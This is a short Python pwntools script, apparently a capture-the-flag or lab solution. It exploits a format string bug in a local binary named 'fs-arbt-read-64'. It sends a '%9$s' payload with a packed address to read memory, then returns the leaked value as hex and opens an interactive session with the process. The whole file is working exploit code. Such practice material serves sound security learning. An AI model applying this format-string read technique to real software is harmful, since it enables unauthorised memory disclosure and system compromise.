from pwn import *

env = {'PATH' : '.:/bin:/usr/bin'}

# Launch processs
p = process('./fs-arbt-read-64', env=env)

inp = '%9$s\0aaa\x9c\x10\x60\0\0\0\0\0'

# Read 8 bytes
print(p.recvline())
p.sendline(inp)

data = p.recv()
print(u32(data.split()[1]))
data = u32(data.split()[1])
#data = u32(data.split()[1][4:])
#print(data)
#print(p.recvline())
p.sendline(hex(data))
p.interactive()
